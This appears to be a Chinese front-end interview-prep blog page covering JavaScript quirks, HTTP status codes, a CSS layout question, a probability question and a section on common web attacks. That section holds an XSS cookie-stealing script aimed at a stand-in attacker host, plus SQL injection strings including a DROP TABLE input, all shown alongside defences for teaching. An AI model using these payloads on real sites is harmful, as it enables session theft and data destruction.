<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Function</span>.prototype.myFind = <span class="function"><span class="keyword">function</span>(<span class="params">obj</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">let</span> _this = <span class="keyword">this</span>;</span><br><span class="line">  <span class="keyword">let</span> argArr = [];</span><br><span class="line">  <span class="keyword">let</span> arg1 = [];</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">1</span>; i &lt; <span class="built_in">arguments</span>.length; i++)&#123;  </span><br><span class="line">    arg1.push( <span class="built_in">arguments</span>[i] );</span><br><span class="line">    argArr.push( <span class="string">'arg1['</span> + (i - <span class="number">1</span>)  + <span class="string">']'</span> ) ;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">let</span> val ;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="built_in">arguments</span>.length; i++)&#123;</span><br><span class="line">      argArr.push( <span class="string">'arguments['</span> + i + <span class="string">']'</span> ) ;</span><br><span class="line">    &#125;</span><br><span class="line">    obj._fn_ = _this;</span><br><span class="line">    <span class="built_in">console</span>.log(argArr);</span><br><span class="line">    val = <span class="built_in">eval</span>( <span class="string">'obj._fn_('</span> + argArr + <span class="string">')'</span> ) ;</span><br><span class="line">    <span class="keyword">delete</span> obj._fn_;</span><br><span class="line">    <span class="keyword">return</span> val;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ol>
<hr>
<h2 id="简述http工作原理"><a href="#简述http工作原理" class="headerlink" title="简述http工作原理"></a>简述http工作原理</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><h3 id="常见的http状态码："><a href="#常见的http状态码：" class="headerlink" title="常见的http状态码："></a>常见的http状态码：</h3><ul>
<li><p><strong>1XX系列</strong>：指定客户端应相应的某些动作，代表请求已被接受，需要继续处理。</p>
</li>
<li><p><strong>2XX系列</strong>：代表请求已成功被服务器接收、理解、并接受。<br>200(成功): 请求成功<br>201(已创建): 请求成功并且服务器创建了新的资源<br>202(已接受): 服务器已接受请求，但尚未处理</p>
</li>
<li><p><strong>3XX系列</strong>：代表需要客户端采取进一步的操作才能完成请求，这些状态码用来重定向，后续的请求地址（重定向目标）在本次响应的 Location 域中指明。<br>300(多种选择): 针对请求，服务器可执行多种操作<br>301(永久移动): 被请求的资源已永久移动到新位置<br>302(临时移动): 服务器目前从不同位置的网页响应请求，但请求者应继续使用原有位置来进行以后的请求</p>
</li>
<li><p><strong>4XX系列</strong>：代表了客户端看起来可能发生了错误，妨碍了服务器的处理。<br>400(错误请求): 服务器不理解请求的语法<br>401(未授权): 请求要求身份验证<br>403(拒绝): 服务器已经理解请求，但是拒绝执行它<br>404(未找到): 服务器找不到请求的网页<br>413(请求实体过大): 请求实体过大，服务器无法处理请求<br>414(请求的URI过长): 请求的 URI（通常为网址）过长，服务器无法处理</p>
</li>
<li><p><strong>5xx系列</strong>：代表了服务器在处理请求的过程中有错误或者异常状态发生。<br>500(服务器内部错误): 服务器错误<br>502(错误网关): 服务器作为网关或代理，从上游服务器收到无效响应<br>505(HTTP版本不受支持): 服务器不支持请求中所用的 HTTP 协议版本</p>
</li>
</ul>
<hr>
<h2 id="几种常见web攻击手段"><a href="#几种常见web攻击手段" class="headerlink" title="几种常见web攻击手段"></a>几种常见web攻击手段</h2><p>前端面试只需答 <code>XSS</code> 和 <code>CSRF</code> 两种</p>
<h3 id="XSS-跨站脚本攻击"><a href="#XSS-跨站脚本攻击" class="headerlink" title="XSS(跨站脚本攻击)"></a>XSS(跨站脚本攻击)</h3><ul>
<li><p>概念<br>全称是跨站脚本攻击（Cross Site Scripting），指攻击者在网页中嵌入恶意脚本程序。</p>
</li>
<li><p>案例<br>比如说我写了一个博客网站，然后攻击者在上面发布了一个文章，内容是这样的<code>&lt;script&gt;window.open(“www.gongji.com?param=”+document.cookie)&lt;/script&gt;</code>,如果我没有对他的内容进行处理，直接存储到数据库，那么下一次当其他用户访问他的这篇文章的时候，服务器从数据库读取后然后响应给客户端，浏览器执行了这段脚本，然后就把该用户的cookie发送到攻击者的服务器了。</p>
</li>
<li><p>被攻击的原因<br>用户输入的数据变成了代码，比如说上面的<code>&lt;script&gt;</code>,应该只是字符串却有了代码的作用。</p>
</li>
<li><p>预防<br>将输入的数据进行转义处理，比如说讲 <code>&lt;</code> 转义成<code>&amp;lt；</code></p>
</li>
</ul>
<h3 id="CSRF-跨站请求伪造"><a href="#CSRF-跨站请求伪造" class="headerlink" title="CSRF(跨站请求伪造)"></a>CSRF(跨站请求伪造)</h3><ul>
<li><p>概念<br>全称是跨站请求伪造(cross-site request forgery),指通过伪装成受信任用户的进行访问，通俗的讲就是说我访问了A网站，然后cookie存在了浏览器，然后我又访问了一个流氓网站，不小心点了流氓网站一个链接（向A发送请求），这个时候流氓网站利用了我的身份对A进行了访问。</p>
</li>
<li><p>案例<br>1、这个例子可能现实中不会存在，但是攻击的方式是一样的。比如说我登录了A银行网站，然后我又访问了室友给的一个流氓网站，然后点了里面的一个链接 <a href="http://www.A.com/transfer?account=666&amp;money=10000,那么这个时候很可能我就向账号为666的人转了1w。" target="_blank" rel="noopener">www.A.com/transfer?account=666&amp;money=10000,那么这个时候很可能我就向账号为666的人转了1w。</a><br>2、注意这个攻击方式不一定是我点了这个链接，也可以是这个网站里面一些资源请求指向了这个转账链接。</p>
</li>
<li><p>被攻击的原因<br>用户本地存储cookie，攻击者利用用户的cookie进行认证，然后伪造用户发出请求。</p>
</li>
<li><p>预防<br>1、之所以被攻击是因为攻击者利用了存储在浏览器用于用户认证的cookie，那么如果我们不用cookie来验证不就可以预防了。所以我们可以采用token（不存储于浏览器）认证。</p>
<p>2、通过referer识别，HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器我是从哪个页面链接过来的，服务器基此可以获得一些信息用于处理。那么这样的话，我们必须登录银行A网站才能进行转账了。</p>
</li>
</ul>
<h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><ul>
<li><p>概念<br>通过sql命令伪装成正常的http请求参数，传递到服务器端，服务器执行sql命令造成对数据库进行攻击。</p>
</li>
<li><p>案例<br>1、<code>&#39; or &#39;1&#39;= &#39;1</code>。这是最常见的sql注入攻击，当我们输如用户名 <code>jiajun</code> ，然后密码输如 <code>&#39;or &#39;1&#39;= &#39;1</code>的时候，我们在查询用户名和密码是否正确的时候，本来要执行的是 <code>select * from user where username=&#39;&#39; and password=&#39;&#39;</code>,经过参数拼接后，会执行sql语句 <code>select * from user where username=&#39;jaijun&#39; and password=&#39; &#39; or &#39;1&#39;=&#39;1&#39;</code>，这个时候1=1是成立，自然就跳过验证了。</p>
<p>2、但是如果再严重一点，密码输如的是 <code>&#39;;drop table user;--</code>，那么sql命令为 <code>select * from user where username=&#39;jiajun&#39; and password=&#39;&#39;;drop table user;--&#39;</code> 这个时候我们就直接把这个表给删除了。</p>
</li>
<li><p>被攻击的原因<br>sql语句伪造参数，然后在对参数进行拼接的后形成破坏性的sql语句，最后导致数据库受到攻击。</p>
</li>
<li><p>预防<br>1、在java中，我们可以使用预编译语句(PreparedStatement)，这样的话即使我们使用sql语句伪造成参数，到了服务端的时候，这个伪造sql语句的参数也只是简单的字符，并不能起到攻击的作用。</p>
<p>2、很多orm框架已经可以对参数进行转义。</p>
<p>3、做最坏的打算，即使被’拖库‘(‘脱裤，数据库泄露’)。数据库中密码不应明文存储的，可以对密码使用md5进行加密，为了加大破解成本，所以可以采用加盐的（数据库存储用户名，盐（随机字符长），md5后的密文）方式。</p>
</li>
</ul>
<h3 id="DDOS"><a href="#DDOS" class="headerlink" title="DDOS"></a>DDOS</h3><ul>
<li><p>概念<br>分布式拒绝服务攻击（Distributed Denial of Service），简单说就是发送大量请求是使服务器瘫痪。DDos攻击是在DOS攻击基础上的，可以通俗理解，dos是单挑，而ddos是群殴，因为现代技术的发展，dos攻击的杀伤力降低，所以出现了DDOS，攻击者借助公共网络，将大数量的计算机设备联合起来，向一个或多个目标进行攻击。</p>
</li>
<li><p>案例<br>1、SYN Flood ,简单说一下tcp三次握手，客户端先服务器发出请求，请求建立连接，然后服务器返回一个报文，表明请求以被接受，然后客户端也会返回一个报文，最后建立连接。那么如果有这么一种情况，攻击者伪造ip地址，发出报文给服务器请求连接，这个时候服务器接受到了，根据tcp三次握手的规则，服务器也要回应一个报文，可是这个ip是伪造的，报文回应给谁呢，第二次握手出现错误，第三次自然也就不能顺利进行了，这个时候服务器收不到第三次握手时客户端发出的报文，又再重复第二次握手的操作。如果攻击者伪造了大量的ip地址并发出请求，这个时候服务器将维护一个非常大的半连接等待列表，占用了大量的资源，最后服务器瘫痪。</p>
<p>2、CC攻击，在应用层http协议上发起攻击，模拟正常用户发送大量请求直到该网站拒绝服务为止。</p>
</li>
<li><p>被攻击的原因<br>服务器带宽不足，不能挡住攻击者的攻击流量。</p>
</li>
<li><p>预防<br>1、最直接的方法增加带宽。但是攻击者用各地的电脑进行攻击，他的带宽不会耗费很多钱，但对于服务器来说，带宽非常昂贵。<br>2、云服务提供商有自己的一套完整DDoS解决方案，并且能提供丰富的带宽资源。</p>
</li>
</ul>
<hr>
<h2 id="‘1’-‘2’-‘3’-map-parseInt"><a href="#‘1’-‘2’-‘3’-map-parseInt" class="headerlink" title="[‘1’, ‘2’, ‘3’].map(parseInt);"></a>[‘1’, ‘2’, ‘3’].map(parseInt);</h2><p>结果：<code>[1, NaN, NaN]</code></p>
<p>考察知识点：<code>map</code>和<code>parseInt</code></p>
<ul>
<li><p><code>map</code>传递两个参数：<code>Array.map(element, index, array)</code></p>
</li>
<li><p><code>parseInt</code>传递两个参数：<code>parseInt(string, radix)</code><br>参数radix表示进制数，2~36，如果不设置或为0，则默认取10进制转换，如果小于0、等于1或大于36，则返回<code>NaN</code></p>
</li>
</ul>
<p>原题先转换成：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">'1'</span>, <span class="string">'2'</span>, <span class="string">'3'</span>].map(<span class="function"><span class="keyword">function</span> (<span class="params">element</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`<span class="subst">$&#123;element&#125;</span>`</span>; <span class="comment">// ["1", "2", "3"]</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">[<span class="string">'1'</span>, <span class="string">'2'</span>, <span class="string">'3'</span>].map(<span class="function"><span class="keyword">function</span> (<span class="params">element, index</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`<span class="subst">$&#123;element&#125;</span>-<span class="subst">$&#123;index&#125;</span>`</span>; <span class="comment">// ["1-0", "2-1", "3-2"]</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">[<span class="string">'1'</span>, <span class="string">'2'</span>, <span class="string">'3'</span>].map(<span class="function"><span class="keyword">function</span> (<span class="params">element, index, array</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`<span class="subst">$&#123;element&#125;</span>-<span class="subst">$&#123;index&#125;</span>-<span class="subst">$&#123;array&#125;</span>`</span>; <span class="comment">// ["1-0-1,2,3", "2-1-1,2,3", "3-2-1,2,3"]</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">[<span class="string">'1'</span>, <span class="string">'2'</span>, <span class="string">'3'</span>].map(<span class="function"><span class="keyword">function</span> (<span class="params">element, index, array, other</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`<span class="subst">$&#123;element&#125;</span>-<span class="subst">$&#123;index&#125;</span>-<span class="subst">$&#123;array&#125;</span>-<span class="subst">$&#123;other&#125;</span>`</span>; <span class="comment">// ["1-0-1,2,3-undefined", "2-1-1,2,3-undefined", "3-2-1,2,3-undefined"]</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>
<p>由此可以也可以看出，map的参数最多3个。<br>原题先求执行 <code>map</code> ，然后再执行括号中的 <code>parseInt</code>，<code>parseInt</code> 接收的参数是 <code>map</code> 中的 <code>element</code> 和 <code>index</code><br>所以原题再转换成：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">parseInt</span>(<span class="string">'1'</span>, <span class="number">0</span>); <span class="comment">// 1</span></span><br><span class="line"><span class="built_in">parseInt</span>(<span class="string">'2'</span>, <span class="number">1</span>); <span class="comment">// NaN，因为没有1进制</span></span><br><span class="line"><span class="built_in">parseInt</span>(<span class="string">'3'</span>, <span class="number">2</span>); <span class="comment">// NaN，虽然有二进制，但是2进制中没有3</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 同理</span></span><br><span class="line"><span class="built_in">parseInt</span>(<span class="string">'4'</span>, <span class="number">3</span>)</span><br><span class="line"><span class="built_in">parseInt</span>(<span class="string">'5'</span>, <span class="number">4</span>)</span><br><span class="line"><span class="built_in">parseInt</span>(<span class="string">'6'</span>, <span class="number">5</span>)</span><br><span class="line">[<span class="string">'1'</span>, <span class="string">'2'</span>, <span class="string">'3'</span>, <span class="string">'4'</span>, <span class="string">'5'</span>, <span class="string">'6'</span>].map(<span class="built_in">parseInt</span>); <span class="comment">// [1, NaN, NaN, NaN, NaN, NaN]</span></span><br></pre></td></tr></table></figure></p>
<p>同理<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>].map(<span class="built_in">parseInt</span>) <span class="comment">// [10, NaN, 2]</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add</span> (<span class="params">num1, num2</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> num1 + num2</span><br><span class="line">&#125;</span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>].map(add) <span class="comment">// [1, 3, 5]</span></span><br></pre></td></tr></table></figure></p>
<hr>
<h2 id="false-为什么为true，-false-为什么为false"><a href="#false-为什么为true，-false-为什么为false" class="headerlink" title="[]==false 为什么为true，!![]==false 为什么为false"></a><code>[]==false</code> 为什么为true，<code>!![]==false</code> 为什么为false</h2><blockquote>
<p><a href="https://segmentfault.com/a/1190000016555947?utm_source=tag-newest" target="_blank" rel="noopener">segmentfault</a><br>js隐式转换：</p>
<ol>
<li>数字 == 字符串    =&gt;  数字 == 数字</li>
<li>数字 == 布尔值    =&gt;  数字 == 数字</li>
<li>字符串 == 布尔值  =&gt;  数字 == 数字</li>
<li>对象 == 布尔值    =&gt;  对象 == 数字</li>
<li>对象 == 数字      =&gt;  字符串 == 数字</li>
</ol>
</blockquote>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">[] == <span class="literal">false</span>; <span class="comment">// true</span></span><br><span class="line">!![] == <span class="literal">false</span>; <span class="comment">// false</span></span><br><span class="line"></span><br><span class="line"><span class="string">''</span> == <span class="literal">false</span>; <span class="comment">// true;</span></span><br><span class="line">!!<span class="string">''</span> == <span class="literal">false</span>; <span class="comment">// true</span></span><br><span class="line"><span class="string">''</span> == <span class="number">0</span>; <span class="comment">// true</span></span><br><span class="line">!!<span class="string">''</span> == <span class="number">0</span>; <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line">[<span class="number">1</span>] == <span class="string">'1'</span>; <span class="comment">// true</span></span><br><span class="line"><span class="literal">null</span> == <span class="number">0</span>; <span class="comment">// false</span></span><br><span class="line"><span class="literal">null</span> == <span class="literal">false</span>; <span class="comment">// false</span></span><br><span class="line"><span class="literal">null</span> == <span class="string">''</span>; <span class="comment">// false</span></span><br><span class="line"><span class="literal">null</span> == <span class="literal">undefined</span>; <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="number">0</span> == <span class="literal">false</span>; <span class="comment">// true</span></span><br><span class="line"><span class="number">1</span> == <span class="literal">true</span>; <span class="comment">// true</span></span><br><span class="line"><span class="number">2</span> == <span class="literal">true</span>; <span class="comment">// false</span></span><br></pre></td></tr></table></figure>
<p>[] == false 转换过程如下：</p>
<ol>
<li><p>[] == false; // 对象和布尔值，如果有布尔值，先将布尔值转换成数字<br>如果其中一个操作数为布尔类型，那么布尔操作数如果为true，那么会转换为1，如果为false，会转换为整数0，即0。</p>
</li>
<li><p>[] == 0; // 原值和非原值，把非原值转换成原值，toString()方法<br>如果一个对象与数字或字符串相比较，JavaScript会尝试返回对象的默认值。操作符会尝试通过方法valueOf和toString将对象转换为其原始值（一个字符串或数字类型的值）。如果尝试转换失败，会产生一个运行时错误。<br>注意：当且仅当与原始值比较时，对象会被转换为原始值。当两个操作数均为对象时，它们作为对象进行比较，仅当它们引用相同对象时返回true</p>
</li>
<li><p>‘’ == 0; // 字符串和数字，把字符串转换成数字，Number()方法<br>当比较数字和字符串时，字符串会转换成数字值。 JavaScript 尝试将数字字面量转换为数字类型的值。 首先, 一个数学上的值会从数字字面量中衍生出来，然后这个值将被转为一个最接近的Number类型的值。</p>
</li>
<li><p>0 == 0;</p>
</li>
</ol>
<p>!![] == false 转换过程如下：</p>
<ol>
<li>非运算符优先级大于 ==，先执行![] // !对象 返回 false</li>
<li>!false = true</li>
</ol>
<p>!!’’ == false 转换过程如下：</p>
<ol>
<li>非运算符优先级大于 ==，先执行![] // !空字符串 返回 true、!非空字符串 返回 false</li>
<li>!true = false</li>
</ol>
<p><strong><em>注意</em></strong>：当且仅当与原始值比较时，对象会被转换为原始值。当两个操作数均为对象时，它们作为对象进行比较，仅当它们引用相同对象时返回trues<br>字符串对象的类型是对象，不是字符串！<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="keyword">new</span> <span class="built_in">String</span>(<span class="string">'javascript'</span>) <span class="comment">// typeof a === 'object'</span></span><br><span class="line"><span class="keyword">var</span> b = <span class="keyword">new</span> <span class="built_in">String</span>(<span class="string">'javascript'</span>)</span><br><span class="line"></span><br><span class="line">a == <span class="string">'javascript'</span> <span class="comment">// true</span></span><br><span class="line">a === <span class="string">'javascript'</span> <span class="comment">// false</span></span><br><span class="line">b == <span class="string">'javascript'</span> <span class="comment">// true</span></span><br><span class="line">b === <span class="string">'javascript'</span> <span class="comment">// false</span></span><br><span class="line"></span><br><span class="line">a === b <span class="comment">// false</span></span><br><span class="line">a == b <span class="comment">// false</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> a = <span class="built_in">String</span>(<span class="string">'javascript'</span>) <span class="comment">// typeof a === 'string'</span></span><br><span class="line"><span class="keyword">var</span> b = <span class="built_in">String</span>(<span class="string">'javascript'</span>)</span><br><span class="line">a === b <span class="comment">// true</span></span><br><span class="line">a == b <span class="comment">// true</span></span><br></pre></td></tr></table></figure></p>
<p>效果如下：<br><img src="../images/tools/string_newstring.png" title="String和new String()的区别"></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = &#123;&#125;</span><br><span class="line"><span class="keyword">var</span> b = &#123;&#125;</span><br><span class="line"><span class="keyword">var</span> c = a</span><br><span class="line">a == b <span class="comment">// false</span></span><br><span class="line">a === b <span class="comment">// false</span></span><br><span class="line">a == c <span class="comment">// true</span></span><br><span class="line">a == c <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// a、b为引用类型，判断时看引用的地址，a、b地址不同，a、c地址相同</span></span><br></pre></td></tr></table></figure>
<hr>
<h2 id="什么情况下满足-a-1-amp-amp-a-12"><a href="#什么情况下满足-a-1-amp-amp-a-12" class="headerlink" title="什么情况下满足 a==1 &amp;&amp; a==12"></a>什么情况下满足 a==1 &amp;&amp; a==12</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = ???;</span><br><span class="line"><span class="keyword">if</span>(a == <span class="number">1</span> &amp;&amp; a == <span class="number">12</span>)&#123;  </span><br><span class="line">  <span class="built_in">console</span>.log(a);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>分析：变量a要同时满足==1和==12两个条件，需要实现这种情况，a在执行第一次的时候必然会进行动态改变</p>
<p>解：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 数字的原型上有valueOf、toString等方法，此例中需要重写 a.valueOf 方法</span></span><br><span class="line"><span class="keyword">var</span> a = &#123;</span><br><span class="line">  i: <span class="number">1</span>,</span><br><span class="line">  valueOf () &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.i === <span class="number">1</span>) &#123;</span><br><span class="line">      <span class="keyword">this</span>.i++ <span class="comment">// 取完值后就不再=1了</span></span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">12</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(a == <span class="number">1</span> &amp;&amp; a == <span class="number">12</span>)&#123;  </span><br><span class="line">  <span class="built_in">console</span>.log(a);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 如果一个对象与数字或字符串相比较，JavaScript会尝试返回对象的默认值。操作符会尝试通过方法valueOf和toString将对象转换为其原始值（一个字符串或数字类型的值）。如果尝试转换失败，会产生一个运行时错误。</span></span><br><span class="line"><span class="comment">// 每次执行 a == x 的时候，都是使用 valueOf 和 toString 来对a进行转换</span></span><br><span class="line"><span class="comment">// 第一次 执行 a == 1，执行a.valueOf，执行了a+1，且返回1，所以=true</span></span><br><span class="line"><span class="comment">// 第二次 执行 a == 12，执行a.valueOf，返回12，所以=true</span></span><br></pre></td></tr></table></figure></p>
<hr>
<h2 id="今日头条CSS面试题"><a href="#今日头条CSS面试题" class="headerlink" title="今日头条CSS面试题"></a>今日头条CSS面试题</h2><p>css布局实现以下要求（主要考察css布局、padding设置为百分比时的参照物）：</p>
<ul>
<li>1.子级div左右距离父级边界各50px</li>
<li>2.子级div垂直居中</li>
<li>3.子级div高度是宽度的一半</li>
</ul>
<p>注：css margin、padding的left、right、top、bottom设置为百分比时都是以父级的width为参照</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"outer"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"inner"</span>&gt;</span>ABCD<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.outer</span>&#123;</span><br><span class="line">  <span class="comment">/*  父级内部实现水平、垂直居中  */</span></span><br><span class="line">  <span class="attribute">display</span>: flex;</span><br><span class="line">  <span class="attribute">align-items</span>: center;</span><br><span class="line">  <span class="attribute">justify-content</span>: center;</span><br><span class="line">  </span><br><span class="line">  <span class="attribute">border</span>: <span class="number">5px</span> solid <span class="number">#f00</span>;</span><br><span class="line">  <span class="attribute">width</span>:<span class="number">400px</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">300px</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/*  需求1：子级左右距离父级边距各50px（先不实现这个，最后实现） */</span></span><br><span class="line">  <span class="attribute">padding</span>: <span class="number">0</span> <span class="number">50px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.inner</span>&#123;</span><br><span class="line">  <span class="attribute">border</span>: <span class="number">5px</span> solid <span class="number">#0f0</span>;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#000</span>;</span><br><span class="line">  <span class="attribute">font-size</span>: <span class="number">20px</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/*  需求2：子级内部实现水平、垂直居中  */</span></span><br><span class="line">  <span class="attribute">display</span>: flex;</span><br><span class="line">  <span class="attribute">align-items</span>: center;</span><br><span class="line">  <span class="attribute">justify-content</span>: center;</span><br><span class="line">  <span class="attribute">flex</span>: <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*  需求3：子级内部高度为父级宽度的一半  */</span> </span><br><span class="line">  <span class="attribute">padding</span>: <span class="number">25%</span> <span class="number">0</span>;</span><br><span class="line">  <span class="comment">/*  设置height: 0, 防止文字增加高度  */</span></span><br><span class="line">  <span class="attribute">height</span>:<span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>注：当不实现 <strong>需求1</strong> 的时候，<strong>需求3</strong> 中自己内部高度为50%，即为父级（outer div）宽度的一半，此时由于inner div设置了flex布局（<strong>需求2</strong>），导致子级宽度和父级宽度一样，最后再实现 <strong>需求1</strong>，父级增加左右padding。</p>
<p>效果如下：<br><img src="../images/css/css_box.png" title="css布局"></p>
<hr>
<h2 id="今日头条算法推导题"><a href="#今日头条算法推导题" class="headerlink" title="今日头条算法推导题"></a>今日头条算法推导题</h2><p>假设在今日头条里面，有很多工作人员检查新闻是不是属于虚假新闻，所有新闻真实率到达了98%，工作人员在检验一个真实的新闻把它检验为一个虚假的新闻的概率为2%，而一个虚假的新闻被检验为真实的新闻的概率为5%. 那么，一个被检验为真实的新闻确实是真实的新闻的概率是多大?</p>
<p>A.0.9991</p>
<p>B.0.9989</p>
<p>C.0.9855</p>
<p>D.0.96</p>
<p>答案:B</p>
<p>分析条件得到：<br>真的新闻：98%<br>假的新闻：2%<br>真的-&gt;假的：2%<br>假的-&gt;真的：5%</p>
<p>分析要求：被检验为真实的新闻确实是真实的新闻</p>
<p>首先要明确被检验为真实的新闻包括了（本来是真的和本来是假的）所以分子为（真-&gt;真），分母为（真-&gt;真 + 假-&gt;真）</p>
<p>结果为：（真-&gt;真）/（真-&gt;真 + 假-&gt;真） = (98%<em>(1-2%)) / (98%</em>(1-2%) + 2%*5%) = 0.9604/0.9614 = 0.9989……</p>
<hr>
